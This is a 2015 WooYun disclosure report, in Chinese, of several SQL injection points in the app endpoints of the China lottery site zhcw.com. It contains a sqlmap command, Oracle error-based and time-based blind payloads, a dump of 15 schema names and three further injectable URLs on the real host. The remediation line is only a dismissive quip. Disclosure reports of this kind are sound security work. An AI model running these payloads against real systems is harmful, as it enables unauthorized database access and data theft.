wybug_title: 中彩网APP端多处SQL注入(涉及多个数据库打包)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-05-12：	细节已通知厂商并且等待厂商处理中									2015-05-15：	厂商已经确认，细节仅向厂商公开									2015-05-25：	细节向核心白帽子及相关领域专家公开									2015-06-04：	细节向普通白帽子公开									2015-06-14：	细节向实习白帽子公开									2015-06-29：	细节向公众公开  简要描述： 中彩网是“中国福利彩票发行管理中心”指定的唯一网络信息发布媒体。自1999年成立至今，经过6年多的倾力打造，中彩网已经成为全球排名第一、拥有绝对领先的访问量和用户群体的中文彩票行业垂直门户网站。 详细说明：  
F:\Python26\sqlmap>sqlmap.py -u "http://app.zhcw.com/wwwroot/zhcw/jsp/do3dsjhdc.jsp?method=submit&issueNo=*" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Do you want to process it? [Y/n/q] y[20:26:29] [INFO] resuming back-end DBMS 'oracle'[20:26:29] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: error-based    Title: Oracle OR error-based - WHERE or HAVING clause (XMLType)    Payload: http://app.zhcw.com:80/wwwroot/zhcw/jsp/do3dsjhdc.jsp?method=submit&issueNo=-3073' OR 1661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(104)||CHR(122)||CHR(108)||CHR(113)||(SELECT (CASE WHEN (1661=1661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(105)||CHR(116)||CHR(113)||CHR(62))) FROM DUAL) AND 'lSAl'='lSAl    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: http://app.zhcw.com:80/wwwroot/zhcw/jsp/do3dsjhdc.jsp?method=submit&issueNo=-9452' OR 2337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(89)||CHR(74)||CHR(75),5) AND 'SdTI'='SdTI---[20:26:29] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[20:26:29] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[20:26:29] [INFO] fetching database (schema) names[20:26:30] [INFO] the SQL query used returns 15 entries[20:26:30] [INFO] retrieved: CTXSYS[20:26:30] [INFO] retrieved: DBSNMP[20:26:31] [INFO] retrieved: DMSYS[20:26:31] [INFO] retrieved: EXFSYS[20:26:32] [INFO] retrieved: MDSYS[20:26:32] [INFO] retrieved: OLAPSYS[20:26:33] [INFO] retrieved: ORDSYS[20:26:33] [INFO] retrieved: OUTLN[20:26:34] [INFO] retrieved: SYS[20:26:34] [INFO] retrieved: SYSMAN[20:26:35] [INFO] retrieved: SYSTEM[20:26:35] [INFO] retrieved: TSMSYS[20:26:36] [INFO] retrieved: WMSYS[20:26:36] [INFO] retrieved: XDB[20:26:37] [INFO] retrieved: ZHCWTESTavailable databases [15]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[*] ZHCWTEST[20:26:37] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\app.zhcw.com'[*] shutting down at 20:26:37
第二处注入：http://app.zhcw.com/wwwroot/zhcw/jsp/ltshmtp.jsp?method=query&ISSUE_NO=*第三处注入：http://app.zhcw.com/wwwroot/zhcw/jsp/topday.jsp?catalogName=%E5%9C%A8%E7%BA%BF%E8%AF%95%E5%88%AE*&dateFormat=MM-dd+HH%3Amm&timeType=1第四处：http://app.zhcw.com/wwwroot/zhcw/jsp/Vote/voteAction.jsp?utilType=select&method=getVoteRankByAVG&rownum=10&catalogId=10653,10654,10655,10656,10657,10658*   漏洞证明：     修复方案：  过滤啊少年   版权声明：转载请注明来源 #6c6c6c@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-15 17:51 厂商回复： 暂未能建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
